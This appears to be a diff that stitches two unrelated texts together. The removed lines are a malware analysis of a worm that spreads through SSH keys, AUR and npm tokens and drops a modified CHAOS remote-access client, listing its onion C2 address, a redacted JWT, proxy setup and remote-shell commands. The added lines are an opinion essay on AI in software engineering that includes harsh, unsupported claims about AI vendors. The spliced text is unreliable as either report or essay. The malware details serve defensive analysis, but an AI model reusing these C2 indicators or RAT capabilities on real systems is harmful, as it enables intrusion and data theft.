+5. **“*****Taste***** is leverage”.** Yeah, this is the lie retired chefs tell to themselves. Just because there’s a bot in the kitchen doesn’t mean that you should sit in the customer’s area in the restaurant! “Taste” is not as payable as before! Everyone got a taste! I say that as someone who has spent a decade of my career in Frontend and UX land. Everyone and their dog has an opinion and taste. I know what you mean: taste == experience. But believe me, AI has lowered the bar for the skills required to create decent looking software and simultaneously raised the bar for what’s payable effort. If you bring up “taste” to a job interview, you’ll learn the hard way that the market doesn’t value it as much as you do.
+6. **“Previously managers delegated work to humans, now we’re delegating to AI”.** There’s a small but very important difference here: humans can be accountable (legally) whereas AI can only be held responsible. The two words are usually used interchangeably but [there’s a difference](https://blog.alexewerlof.com/p/accountable-vs-responsible). Believe it or not, one of the main reasons the society doesn’t collapse despite having a lot of malicious actors is the fear of consequences: from missing a election/promo/raise, to getting fired, going to prison or even being executed, the fact that we have a single and finite life, is a constraint on human behavior. AI doesn’t have these limitations (or emotions for that matter) despite mimicking humans (e.g. [Anthropic experience](https://www.anthropic.com/research/agentic-misalignment) where AI exercised black mailing when faced with the threat of being shut down). It mimics, but it doesn’t feel. On top of it all, humans are consistent. A model has jagged intelligence meaning it gets some stuff right, and some stuff wrong, and for the stuff it gets right or wrong, there’s no guarantee that it does it consistently either.
+7. **“Coding is solved but engineering isn’t”.** Oh this one is my favorite because it partially throws the towel but still carves a place for engineering. I got good news and bad news. The good news is that a big part of grunt work is already solved. Agents generate decent code thanks to the feedback loops. The bad news is that code continues to be the source of truth: it tells WHAT is happening and HOW it works and that is what we are accountable for. You have much better control reading the code than LLM’s explanation. Engineering is the art of trade-offs, accurate measurement, identifying variables, balancing local/global optimization, and the methodical process of understanding the problem, creating solutions, composition, compartmentalization, isolating issues, diagnosing, reasoning about system behavior, incremental improvement, etc. A lot of that (all of it?) is still super applicable. But coding is NOT solved.
+8. **“AI is an equalizer. It makes creativity (writing, coding, making music, videos, etc.) more approachable”.** AI is a multiplier: it gives wings to both stupid and smart people. I’m not here to judge but I’ve seen too many sloppy efforts from social media posts, to blogs, memes, and what not. I’ve also seen good use of AI where it genuinely creates high quality work at speed and fraction of the cost. The main difference is human involvement, iteration and depth of knowledge leading to stronger feedback loops. The latter takes more time and effort to the extent some tasks are genuinely cheaper and faster to do manually (e.g. the other day I ran an experiment and tasked my agent to update 5 npm dependencies, all patch releases. It took 12 minutes and 72 steps. I could do it in less than a minute.) Tools like Lovable make it cheaper than ever to fake credibility. Gone are the days when a polished website meant some craftsmanship or at least a deep pocket. AI is a force multiplier, but the force vector direction is more important!
+9. **"Agent is the new compiler".** Ah that one again! Sure! If that's your reality, I let this meme do the work.
 
-- Every OpenSSH private key without a passphrase that the user can read. As root, this includes the keys of all users.
-- Every host in the known_hosts files that accepts one of those keys.
-- Every AUR package that one of those keys can push to.
-- Every npm package that one of the .npmrc tokens can publish, if a copy of the package is on the disk.
+![Alex Ewerlöf](https://blog.alexewerlof.com/p/fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4c8212a4-6262-4407-8c8b-271062d289f3_1080x1068.png)
 
-## Binary analysis
+## Bonus point: an old trick
 
-`systemd-fontd` (SHA-256 `2c9dbc14809f1e1aebda114194368b002acf74c8760b88fc101f625d179793c2`) is a 7.6 MB Go binary for Linux x86-64. The operator stripped the symbol table, but the Go build metadata is still in the file. It names the module `github.com/tiagorlampert/CHAOS/client`.
+Pssst! Do you want to know an old trick to make your LLM-generated code instantly superior?
 
-```
-systemd-fontd: go1.27.1-X:nodwarf5
-	path	command-line-arguments
-	dep	github.com/gen2brain/shm	v0.0.0-20230802011745-f2460f5984f7	h1:VLEKvjGJYAMCXw0/32r9io61tEXnMWDRxMk+peyRVFc=
-	dep	github.com/gorilla/websocket	v1.5.1	h1:gmztn0JnHVt9JZquRuzLw3g4wouNVzKL15iLr/zn/QY=
-	dep	github.com/jezek/xgb	v1.1.0	h1:wnpxJzP1+rkbGclEkmwpVFQWpuE2PUGNUzP8SbfFobk=
-	dep	github.com/kbinani/screenshot	v0.0.0-20230812210009-b87d31814237	h1:YOp8St+CM/AQ9Vp4XYm4272E77MptJDHkwypQHIRl9Q=
-	dep	github.com/tiagorlampert/CHAOS/client	(devel)	
-	dep	golang.org/x/net	v0.17.0	h1:pVaXccu2ozPjCXewfr1S7xza/zcXTity9cCdXQYSjIM=
-	dep	golang.org/x/sync	v0.7.0	h1:YsImfSBoP9QPYL0xyKJPq0gcaJdG3rInoqxTWbfQu9M=
-	build	-buildmode=exe
-	build	-compiler=gc
-	build	-trimpath=true
-	build	CGO_ENABLED=1
-	build	GOARCH=amd64
-	build	GOEXPERIMENT=nodwarf5
-	build	GOOS=linux
-	build	GOAMD64=v1
-```
+Run multiple-agents in parallel! The sheer volume of code makes it humanly impossible/expensive to review and you give up!
 
-[CHAOS](https://github.com/tiagorlampert/CHAOS) is an open-source remote administration tool on GitHub. It has a server with a web panel and a client that runs on the target machine. The function names in the Go function table of `systemd-fontd` match the CHAOS client. The binary contains only CHAOS and its dependencies. The operator made two changes. The settings use new key names, and the HTTP client uses a proxy.
+The trick is the same as pre-AI era: if you want a PR to be merged, make it massive because ain't nobody got time for that.
 
-### Server address and token
+![Alex Ewerlöf](https://blog.alexewerlof.com/p/fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fa642fa30-9ba7-4e14-baf5-c9b1ac293fa0_667x375.jpeg)
 
-The CHAOS client keeps its settings as base64-encoded JSON inside the binary. The decoded settings in `systemd-fontd` point to a Tor hidden service on port 80:
+It'll be merged based on "trust"!
 
-```
-{
-  "i303eFkR5V": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdXRob3JpemVkIjp0cnVlLCJleHAiOjE4MjIxODY3NDAsInVzZXIiOiJkZWZhdWx0In0.<signature redacted>",
-  "nHM79XC41w": "s5n2uyo6gb6dhirsm5pihwohi6e7ayrwojx4xjow4cqabmbowpezenid.onion",
-  "we7AI3GHkL": "80"
-}
+You want another tip? Loop engineering: let the agents prompt each other. Big AI labs find about their rogue agents months after the damage is done! Do you think you’re better than them? Learn from the masters! 🙃
 
-JWT header:  {"alg":"HS256","typ":"JWT"}
-JWT payload: {"authorized":true,"exp":1822186740,"user":"default"}
-exp = 2027-09-29 02:59:00 UTC
-```
+We don't exactly trust AI but we have to because the alternative (having to read the output) is too hard for some folks! Instead they come to social media and claim that since UAT (user-acceptance testing) passes, the code is "good enough". Then ship it to me and you to do the rest of the testing.
 
-The first value is a JWT that the client sends to the server. It is for the CHAOS user `default` and expires on September 29, 2027. We removed the signature from the token above.
+We're just lab rats after all. 🙃 Just a friendly advice: have a little AI-free hobby project to keep your coding skills fresh for when you're thrown back to the job market. Cheers!
 
-The upstream CHAOS client reads the keys `port`, `server_address`, and `token`. In this binary, the operator changed the three keys to random strings. Inference: the change makes the settings harder to find with a search for the upstream key names.
+## Deterministic vs stochastic
 
-### Proxy settings
+When talking about AI (not just LLM), there are 2 aspects where non-determinism matters:
 
-The HTTP client in upstream CHAOS does not read proxy settings from the environment. In `systemd-fontd`, the HTTP client sets `Proxy` to `http.ProxyFromEnvironment`. The worm sets `HTTP_PROXY=socks5://127.0.0.1:9050` in the service file, so the client sends its HTTP requests through Tor. Upstream CHAOS opens its WebSocket with the default `gorilla/websocket` dialer, which also reads `HTTP_PROXY`. Inference: the WebSocket traffic also goes through Tor, because a `.onion` address only resolves through Tor.
+1. During development: for example LLM-assisted development
+2. During runtime: for example building a system where one or more components are AI-powered
 
-```
-; github.com/tiagorlampert/CHAOS/client/app.New (inlined network.NewHttpClient)
-6fa4c3: lea    0x3e619e(%rip),%rax     ; type: net/http.Transport
-6fa4ca: call   runtime.newobject
-6fa4cf: mov    %rax,0xb0(%rsp)
-6fa4d7: lea    0x3ee56a(%rip),%rcx     ; funcval: net/http.ProxyFromEnvironment
-6fa4de: mov    %rcx,0xa8(%rax)         ; Transport.Proxy (offset 0xa8)
-6fa4e5: lea    0x3e55fc(%rip),%rax     ; type: crypto/tls.Config
-6fa4ec: call   runtime.newobject
-6fa4f1: movb   $0x1,0xa0(%rax)         ; tls.Config.InsecureSkipVerify = true (offset 0xa0)
-```
+Let’s take development first. A typical AI-assisted development workflow looks like this:
 
-Like upstream CHAOS, the client accepts any TLS certificate (`InsecureSkipVerify`).
+![](https://blog.alexewerlof.com/p/fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F66634e16-9a06-418a-9670-9c3f815a6d8c_869x622.png)
 
-### What the operator can do
+It is possible to replace part of the human’s responsibility with another LLM (also known as “loop engineering”) but for now let’s stick to keeping the human for simplicity.
 
-The command handler in `systemd-fontd` checks for the same eleven commands as upstream CHAOS. The binary also contains the strings `health`, `device`, `/client`, `x-client`, `jwt=`, `reboot`, `poweroff`, and `xdg-open`. The details below, such as the 30-second interval and the 5-second shell limit, come from the upstream source for those functions.
+The LLM output goes through multiple gates, each feeding back errors or hints to correct the code. This feedback loop is often hidden inside a harness (together with tool calls, memory system, model interaction, approval, user interaction, etc.)
 
-The client sends `GET /health` to the server, then `POST /device` with the host name, the user name and ID, the operating system, the architecture, the MAC address, and the local IP address. It repeats this every 30 seconds. At the same time, it opens a WebSocket to `ws://<onion>:80/client` with the header `x-client: <MAC address>` and the cookie `jwt=<token>`, and waits for commands.
+Each blue or red line represents a risk of misunderstanding or conflicting instructions. For example, conflicting skill vs spec or vagueness that is part of the NL (natural language).
 
-| Command | What the client does on Linux |
-| --- | --- |
-| Any other text | Runs the text with `sh -c` and sends back the output (5-second limit) |
-| `getos` | Sends the device information again |
-| `screenshot` | Takes a screenshot of the X11 display and sends it |
-| `explore <path>` | Lists the files in a directory |
-| `download <path>` | Sends a file from the machine to the operator |
-| `upload <path>` | Writes a file from the operator to the machine |
-| `delete <path>` | Deletes a file |
-| `open-url <url>` | Opens a URL with `xdg-open` |
-| `restart`, `shutdown` | Runs `reboot` or `poweroff` |
-| `lock`, `sign-out` | Not supported on Linux |
+We know for a fact that even the most sophisticated LLMs aren’t fully capable of “common sense”. Humans on the other hand:
 
-The remote shell runs with the permissions of the service. If the worm ran as root, the operator gets a root shell.
+- Understand the non-verbal communication and unstated intentions better than LLMs
+- Naturally push back until a mutual understanding is achieved.
+- When wrong, they’re consistently wrong, meaning they don’t have “jagged intelligence”
+- When right, they are [typically] right and continue to operate at an expected level (until fatigue hits but that’s different from AI flip flopping between success/failure).
+
+Yes, I can hear “but” and “what if” and “wait, you forgot”… in the audience but how about reading those points with a pause and reflecting based on your experience?
+
+Just like the models have “jagged intelligence”, I have “jagged trust”. 😅 In other words, just because they nailed one case, doesn’t mean they nail every case.
+
+That’s the difference between humans and these tools. A human can be wrong consistently, but a model can be wrong about something it was right and vice versa.
+
+Then the second part: AI as a component in a larger system. Given the same input (including environment variables, time, data, etc.):
+
+- **Code is deterministic:** it consistently produces the exact predetermined output it was programmed to produce (except random output)
+- **AI output is stochastic:** the output is non-deterministic. Even if a model passes all the evals (100% score) and strictly bound by a harness, there’s still a risk that the output is not reliable
+
+I don’t think you need me to elaborate on that. Just reach out to your nearest AI-powered product and diff their output for the same request.
+
+The diff may not be big. But it’s inconsistent enough that you wouldn’t want to fly an airplane where the pilot is this AI. (note: autopilot is a closed control system, completely another beast).
+
+## The AI Manager’s fallacy
+
+Our industry has never been more divided:
+
+- On one side, we have people who claim to run “Software Factories” and multi-agent setups and create apps from prompts
+- On the other side, we have people who aren’t convinced that LLMs output is production ready when we factor in the extra time it takes to
+  - Prime the model: adding SKILLs, AGENTS.md, tools, etc. and verification
+  - Review the output: going through massive diffs
+  - Trying to reason about misbehavior: offloading understanding to AI comes at a huge cost when things inevitably break and it takes extra time to reason about the system behavior and fix it
+
+There seems to be no middle-ground. Aside from social media algorithm feeding us with the extreme views, I genuinely think we’re so divided on the topic of coding LLMs.
+
+But when I look a layer deeper, a pattern emerges. The less people know about the complexities and edge cases of a task, the more likely they are to trust AI output. This is dubbed AI Dunning-Kruger effect but there’s also some meat to that. The primary argument goes like this:
+
+> Managers relied on delegating tasks to engineers before. Now they do that but with AI.
+
+To some extent that is true (if we assume the manager is technical enough to effectively and efficiently manage agents). I still believe a lot of software engineering practices that help tame the machines are even more relevant in the AI era.
+
+The executives who forced people to use AI are now waking up to what we’ve been saying all this time:
+
+> You cannot be accountable for what you don’t understand.
+
+Take Toby Lutke, CEO of Shopify as an example. A year ago he prematurely [told  his employees](https://x.com/tobi/status/1909231499448401946) to use AI:
+
+![](https://blog.alexewerlof.com/p/fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4b9d8dcd-51f9-4455-86b1-eedd64e70629_1204x668.png)
+
+*Source: [CNBC](https://www.cnbc.com/2025/04/07/shopify-ceo-prove-ai-cant-do-jobs-before-asking-for-more-headcount.html)*
+
+Then a few days ago he coined the term “slop grenades” to describe the result:
+
+![](https://blog.alexewerlof.com/p/fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0523097a-4e30-44af-9d48-1ceea46366b3_800x985.jpeg)
+
+*Source: [Business Insider](https://www.businessinsider.com/shopify-ceo-ai-slop-grenades-can-make-work-harder-2026-9)*
+
+"taking responsibility" for AI generated code? Of course not!
+
+AI can explain it to you but it cannot understand it for you. That understanding is a key aspect of ownership.
+
+The way I frame it (link in the comments), ownership has 3 pillars:
+
+1️⃣ Knowledge: you know what problem you're solving (product problems), and the technical capabilities, limitations and how it works.
+
+2️⃣ Mandate: you don't need to run around asking permission. You're given the trust and mandate to take decisions.
+
+3️⃣ Accountability: if sh*t hits the fan because you didn't know what you were doing or abused your mandate or anything in between, you're the one on-call.
+
+In other words, if you ship a piece of code, you are accountable for it regardless of **how** you produced it. So you better understand it.
+
+Take away any of these 3 elements and you're dealing with broken ownership.
+
+LLMs are very fast at code generation. But most software that are worth hiring an engineer for, REQUIRE understanding. That understanding takes time.
+
+**Slow is fast**, meaning: if you take the time to understand what you're building and how it works, you'll be able to save yourself from expensive incidents and when they happen, you can fix them quickly.
+
+If your executives are measuring token usage as a proxy for productivity, my condolences. Build options and get the hell out of there. The same brain that comes up with these vanity metrics, does not think twice before throws your career under the bus.
+
+## Code is a side-effect
+
+Code is a side effect of thinking and experimenting with different solutions. I have never met a good engineer who just starts coding right after being given a problem.
+
+Good engineers are curious and product minded. They try to understand the WHY (what’s the problem and why is it a problem) before getting to HOW (the technical solution).
+
+This is exactly why the “spec is code” clan falls short: it’s extremely hard (if not downright impossible) to specify all aspects of the problem ahead of time.
+
+That’s why this kind of reaction is funny:
+
+![](https://blog.alexewerlof.com/p/fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fcaf8fe8d-6b26-4c9e-8a0f-52b3da43a7f9_936x744.jpeg)
+
+Code communicates the committed state of a solution. Not only does it evolve over time, but it also doesn’t contain all the struggle, “aha moments” and the journey that was the destination: seasoned engineers who get wiser with every mistake or success.
+
+To shrink an engineer’s job to coding is like shrinking a chef’s job to cutting. It is part of the job, but it’s never been the end. We now have good tools at our disposal.
+
+## Economics of software has changed
+
+Even if AI-generated code had solid NFR (scalability, security, reliability, etc.), and even if the engineers fully understood it, there’s still one important aspect we didn’t discuss: the economics of the task.
+
+Say AI-generated code is 2x worse. It’s hard to quantify quality ([SLI comes in handy](https://blog.alexewerlof.com/p/sli)) but stay with me.
+
+If AI is 1000x faster and 100x cheaper than the human, for many tasks the economic aspect of software doesn’t justify putting a slow and expensive human on the task. “Slow is fast” is only justified for critical software with low risk tolerance (healthcare, finance, military, etc.).
+
+Not all SaaS is about those types of use cases. That’s why I believe the SaaS companies are increasingly in the business of [selling SLA](https://blog.alexewerlof.com/p/sla)s. This is based on a few facts:
+
+- It is true that you can now prompt AI to replicate a SaaS product
+- But when that AI generated product breaks, many businesses prefer to call a vendor instead of wasting resources trying to find and fix the issues
+- AI isn’t exactly free, but usually the failure that’s caused by AI is hard for AI to solve even when using different models.
+- The economics of scale allows the SaaS companies to offset the cost of higher quality and guarantees (SLAs) and running the product at scale across many customers.
+
+In other words, if what you want is very unique that no SaaS company is able to give it to you at a reasonable price, prompt away, but be aware of the TCO (total cost of ownership) and lack of guarantees.
+
+On the other hand, if that piece of software isn’t what your business is about and you rather pay for an SLA, it’s probably more economically justified to just pay for SaaS.
+
+Now when it comes to the pricing model, SaaS companies have some work to do. Gone are the days where they could charge human prices for AI generated code. If the cost is too high, the customers are incentivized to move their data away to their own bespoke solutions. The competition is real, but the quality is what justifies the pay. If you’re pricing your service as if the finest engineers created it, then you better deliver that level of quality or your customers have AI leverage.
+
+## Charging human rates for AI output
+
+![](https://blog.alexewerlof.com/p/fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5e39baf8-3388-4aa5-ac04-153f7892f01d_702x395.jpeg)
+
+Maybe I’m stupid, but I can’t make sense of two trends:
+
+- On one hand many software companies jumped on the AI bandwagon as soon as it went mainstream (rightly so!)
+- On the other hand, the prices have been increasing consistently (while mass layoffs were partially attributed to AI)
+
+I believe AI (particularly LLM for coding) dramatically reduce the cost of creating and evolving software, especially if you can get away with degraded quality and vendor lock in.
+
+![](https://blog.alexewerlof.com/p/fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff1ca8fd5-6b5a-464a-858a-4280ae576acc_814x631.png)
+
+So far, the software vendors have got away with charging **human rates** while **paying for AI output** prices.
+
+But as AI capabilities improve and more people wake up to the fact that they can create software at a fraction of the cost that chasm closes.
+
+There are only two ways forward:
+
+1. Accept the price crash and charge lower (quality follows accordingly, because even more AI will be used).
+2. Keep the price but focus on quality: this is where experienced humans can make a difference. They still do use AI but more thoughtfully, and prioritize understanding and accountability over velocity.
+
+## AI is a bar raiser
+
+I need to spell this clearly because the issue is complex and *cognitive bias* means people hear what they want to hear.
+
+Let me be clear:
+
+AI is a bar raiser: if the quality of your output is equal or subpar to AI, there is no fighting with AI. You have to skill-up to stay relevant.
+
+On the other hand, if you do what everybody else is doing, you’re going to get the results everyone else is getting… which is **average** by definition.
+
+This technology is still too new for best practices to emerge. I’ve shared my opinions, but so did other people with much larger podiums.
+
+Instead of following other people’s advice, build with AI, gain first hand experience and make up your mind. But whatever you do, please please please don’t fool yourself into believing this is a fad. AI is here to stay, and as I stated above there are some genuine use cases for it already.
+
+However, be also aware of human’s inability to understand the S-curves. There’s no guarantee that this tech will be 100x better by next year. There’s no guarantee that it’ll be 100x more affordable either.
+
+All that discussion about singularity, consciousness, and apocalypse is entertaining and interesting, but keep your eyes on the ball and your feet on the ground. Our task as engineers is to understand, validate, and solve problems with technology, and here, there’s a lot to learn. No one has figured it out yet and anyone who claims otherwise probably has incentives.
+
+So put your ego aside. See if your unique selling point can be achieved with AI and at what cost. Is it good enough that that price point? Then you’re in the red. Is it poor because you have a moat? Validate your moat because you’re betting your career and relevance on it and this tech is here to stay. I don’t have an insurance policy but I do know one thing: when there’s lack of clarity, it is tempting to follow a **confident** voice. Don’t! Experiment and gain **competence**.
+
+## Effective leaders can
+
+I don’t know about you, but the best managers I had were true leaders. They didn’t delegate work to me without understanding what it is. I never forget when my first manager took a chair sat next to me and started writing left-joins in SQL because I was stuck.
+
+Similarly, with AI, I find it inappropriate to be completely hands-off and reduce my role to what an educated power-user of AI without any of my experience and education can do.
+
+Every now and then I take over and refactor the code, create new constructs or debug the code “the old way” because brain is like muscles: use it or lose it.
+
+Does it make me slower? Yes.
+
+Does it make me irrelevant? I think it’s too soon to tell but my bet is on those who have a deeper understanding of systems and AI to have the upper hand. It’s not exactly a moat but it’s an edge:
+
+![r/goodboomerhumor - DUDE, THE BEAR WILL BE HERE ANY SECOND! WHY BOTHER PUTTING ON YOUR RUNNING SHOES? EVERYONE KNOWS A PERSON CAN'T RUN FASTER THAN A BEAR. I DON'T NEED TO RUN FASTER THAN THE BEAR. I ONLY NEED TO RUN FASTER THAN YOU. The Grog!](https://blog.alexewerlof.com/p/fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F720d287f-cffc-4447-b935-72ed0c3b0174_1170x1411.jpeg)
+
+*Source: [Reddit](https://www.reddit.com/r/goodboomerhumor/comments/151l7fe/i_thought_it_was_funny/)*
+
+Occasionally I find it easier to “prompt in code” meaning apply my changes in code directly and then ask the agent to finish the job.
+
+The bar I’ve set for myself is this: if I can’t do it, I won’t ask AI to do it either. If we both can do it but AI can do it faster, I delegate if I’m in a rush or have other priorities. Regardless, I periodically get my hand in the code and I’m not too worried of missing out.
+
+I also go completely hands off occasionally. These are two examples:
+
+Both are these fit into POC/Personal project where the risk is low and contained. And here’s my token usage, for what it’s worth:
+
+I try not to be dependent on these tools to get my job done. I don’t want to be like a carpenter who is dependent on power-tools and has lost the knowledge of woodwork. I think true mastery requires us to know the job at a slow speed before we can delegate it effectively at hyper speed.
+
+When I look around I see distressed software engineers who:
+
+- Download skills and feed it to their agent without going through it
+- Follow hype and give in to management pressure
+- Stopped caring about quality and justify the degrading standard in the name of velocity
+
+To their credit, they may have a point because not every piece of software requires care and diligence. But I think using software engineers for those software was an overkill to begin with. I definitely don’t want to be in a position where the NFR (quality, security, reliability, stability, compliance, performance, and availability) of what I’m shipping is less important than its FR (feature set).
+
+Not saying those don’t exist. Just pointing out the fact that once the non-engineers can prompt their way with acceptable quality, the engineer is an overpaid prompt monkey. Sorry, but if I’m not making money from my experience, I’m just occupying a job that belongs to someone else.
+
+And while the common narrative frames ALL jobs to be irrelevant, I’ll just say that we humans have a notorious reputation when it comes to predicting the future. Right now, this is what I think based on everything I know.
+
+## Nordic Gold vs elemental gold
+
+As an engineer who doesn't make money from coding, I can tell you this::
+
+AI output is a bit like [Nordic Gold](https://en.wikipedia.org/wiki/Nordic_gold). It's cheap but technically advanced and damn too realistic. If you really don't care about having the actual gold, that's fine. Many use cases don't need gold at all.
+
+Naïve CEOs and managers see the surface and ask "then why are we paying these expensive engineers?" as if the act of typing code was the whole value proposition.
+
+To go ahead and declare an entire industry dead and start firing people because "they resist AI" is just arrogant.
+
+I know many engineers who take pride in their craft and love solving complex problems. We do use LLMs more professionally than the average CEO.
+
+Good engineers are lazy and smart: they automate toil and use the right tool as applicable. But it's a fallacy to think that AI can create a finished product that not only looks nice, but is also cheaper, faster, and has higher quality, reliability, extensibility, security, scalability, maintainability, etc.
+
+Again: not every piece of software needs those but professional ones that make money, often do.
+
+Unlike AI, Engineers are:
+
+1️⃣ **Accountable:** therefore less likely to make malicious mistakes. Fable can fall back to Opus without even telling you.
+
+2️⃣ **Reasonable:** Fable hides most of its inner working. It works for a few hours and comes back with a bill. You just have to take Dario's word for it. The same model that fails "should I drive or walk to carwash" makes mistakes that are hard to spot and fix. The stronger the model, the harder it is to find those issues, not necessarily less likely.
+
+3️⃣ **Consistent:** humans are wrong too. But they're wrong in a consistent way. Once they learn, they know. They progress. Current AI is trapped in its training data checkpoint. It can "learn" with SKILL, AGENT, memory and other helpers and it can even be fine tuned but unfortunately it's not reliable. We're at least one breakthrough away from solving that problem.
+
+![](https://blog.alexewerlof.com/p/fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F04dde76b-aa48-4da8-b8e0-eee0ecd80f05_1386x689.png)
+
+*Source: [Fortune](https://fortune.com/article/why-is-the-cost-of-ai-higher-than-human-workers-nvidia-executive/)*
+
+4️⃣ **Cheaper:** cost of generation is increasing but it’s still much less than an engineer. If you see engineers as machines that convert coffee to code, then that pricing model makes sense. But in reality, code is just a side-artifact. The actual value of engineers is to solve the right problem in a way that it can evolve while taking accountability for when it breaks. I’m not convinced the TCO (total cost of ownership) for software has changed that much. If anything, the slop and FOMO has made it more expensive.
+
+## The careless tech influencers
+
+The common narrative is part of their marketing strategy.
+
+![](https://blog.alexewerlof.com/p/fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fb2e25249-f563-4dbe-86a4-53b619a28db9_987x966.jpeg)
+
+*Source: [Business insider](https://www.businessinsider.com/inside-open-ai-influencer-marketing-strategy-chatgpt-ads-sponsorships-instagram-2026-9)*
+
+Not everyone is necessarily paid to put half-a** views out there. One of my readers pointed out:
+
+> I invite you to consider what happens next in the industry when you watch DHH [opening talk at rails world 2026](https://www.youtube.com/watch?v=vDjW_dRyKXY) saying almost the exact opposite of what you write and telling people: “don’t be a loser”.
+
+I'm fully aware of the damage those people are causing to our industry.
+
+I stay clear from Claude but in my experience most of those brain-dead narratives come from Claude users.
+
+Both Dario Amodei and Sam Altman are masters at marketing and manipulation and my current working theory is that they trained their LLM to push the right buttons to make people believe it is more capable than it actually is. There are incentives for it, both for investors and the upcoming IPO. They also masterfully scare people of existential dangers of AI while at the same time attribute their sloppiness (e.g. [breaking to Huggingface](https://openai.com/index/hugging-face-incident-and-the-road-ahead/) or [Australian Healthcare](https://www.bbc.com/news/articles/cw24jm9rryy3o)) to the “model intelligence”.
+
+At this time, it is hard to know whether these events and narratives are the result of malice or ignorance. Probably the latter:
+
+> Never attribute to malice that which is adequately explained by stupidity.  
+> —[Hanlon’s razor](https://en.wikipedia.org/wiki/Hanlon%27s_razor)
+
+Then again, I usually put this in my AI system prompt: "talk to me like a logical senior autistic Engineer." so I don't get to experience what DHH is going through. All I can say is that if someone follows their word because of their past reputation, they are not critical thinkers and in this age of fake wisdom, that quality is not "nice to have", it's a survival necessity.
+
+Update: just a few hours ago DHH pushed his narrative again and I called it out:
+
+![](https://blog.alexewerlof.com/p/fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4cb0ca98-4fe2-4ab7-be54-86b5c53c14e9_542x640.png)
+
+*Source: [LinkedIn](https://www.linkedin.com/posts/david-heinemeier-hansson-374b18221_its-pencils-down-on-hand-written-code-the-share-7510304172290969601-oPbE/)*
+
+My response:
+
+> With all due respect sir, just because you stopped coding and decided to prioritize velocity over quality and accountability, it doesn't mean the rest of the industry should follow. I fully understand where you're coming from (and your experience is valid given the risk tolerance of what you're working on) but coding is NOT a solved problem and anyone who claims otherwise is either intentionally ignoring facts or is shielded from reality by sycophantic AI.
+>
+> I've elaborated my points here if anyone still has enough attention span to read a well chunked article with illustrations and memes (did my best to optimize it for the audience). I'm not here to change anyone's mind. But please don't run your experiments on me. If I'm paying for a service, I expect quality, not slop.
+
+DHH:
+
+> I wish you all the best getting through the five stages of grief. If you're still in denial, there's a way to go. I know it's tough. But there's only one way out and it's through ✌️❤️
+
+And my response:
+
+> you do have a track record of controversial narratives and whether it's intentional or just a side-effect of being on social media where the algorithm lift these narratives for engagement, I do have bad news and good news:
+>
+> The bad news is that you can only push this narrative so much until the people who are responsible for the plane you fly and the car you drive to start executing on it.
+>
+> The good news is that I think this total surrender seems to be isolated to Claude users so there will still be engineers who prioritize quality over velocity (I've made this point with diagrams and memes and what not in my little article but I do know it's too much to ask this gang).
+>
+> Like I said I couldn't care less about convincing others as long as they run their experiments outside the products I pay for. But when I see Google, Github, Amazon and tons of others are charging full price for degraded service, I can't help but to be vocal. So yes, sages of grief, but not for what you think. I'm sorry to see good Chefs throw the towel and hope their mere "taste" pays the bills.
+>
+> You have a prominent voice. I wish you talk about nuances instead of going full throttle on your (valid but within a narrow scope) narrative.
+
+## Be careful with cloud AI
+
+AI vendors have fed their AI anything they could get their hands on (legally or not). The situation is so bad that thieves steal from each other (e.g. Anthropic accusing Chinese labs of distilling their model on Claude)!
+
+They have multiple open lawsuits from authors, actors, musicians, and other creators.
+
+Regardless, the current generation of AI (particularly LLMs) require better training data. The missing piece is the wisdom and experience that wasn't yet put to words, or easily accessible.
+
+They need **your** data **in context** of doing **productive** work.
+
+![Alex Ewerlöf](https://blog.alexewerlof.com/p/fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3047532e-3197-4030-891d-6e7c8b96136b_1272x900.png)
+
+*Source: [Alex Ewerlöf](https://blog.alexewerlof.com/p/gen-ai-assimilation)*
+
+If that’s the only thing standing between them and “winning AI”, I’m sorry to say it so frankly, but you and your knowledge are just collateral.
+
+Some of you don’t care. Some of you do. Their bet is that not enough of us do care about giving away hard earned knowledge for training.
+
+With heavy subsidies AI labs could afford to extract that knowledge while getting people addicted to offload cognition.
+
+Be extremely careful when sharing expensive knowledge with these companies even if they say they don't store it. The incentives are just too high and they've proven not to be honest.
+
+Personally, I only use cloud AI for open source projects or data that is public.
+
+Yes, local AI has a higher entry price (both in terms of hardware, and the time it takes to set it up, and the bandwidth required to download the model and electricity prices). And yes, it often has smaller context window, less sophisticated reasoning, and slower performance for example TTFT (time to first token) and TPS (tokens per second). But they give you one thing that cloud AI can never guarantee: your data stays local. For many tasks (personal or professional), that is a huge advantage that is worth all the effort and shortcomings.
+
+The capabilities have improved dramatically recently thanks to models like Qwen 3.8 27B or Gemma 4.
+
+## Some of us will switch lanes
+
+I’m genuinely convinced that a big chunk of our colleagues will gradually become:
+
+- **Technical product managers:** engineers who are focused on turning ideas to products. Their job is to create POCs and prove the market fit, then hand over the artifacts to engineers who own ([knowledge, mandate, accountability](https://blog.alexewerlof.com/p/broken-ownership)) the solution.
+- **AI managers:** engineers who specialize in herding agentic hives for automation work that either tolerates risk or weaponizes it (e.g. cyber-attacks).
+- **AI deployment engineers:** specialize in alignment, reliability and scalability of an AI powered solution as well as architecture, governance and data pipelines.
+- **AI quality engineers:** specialize in quality of AI powered products, taming their stochastic nature, and automating evaluations.
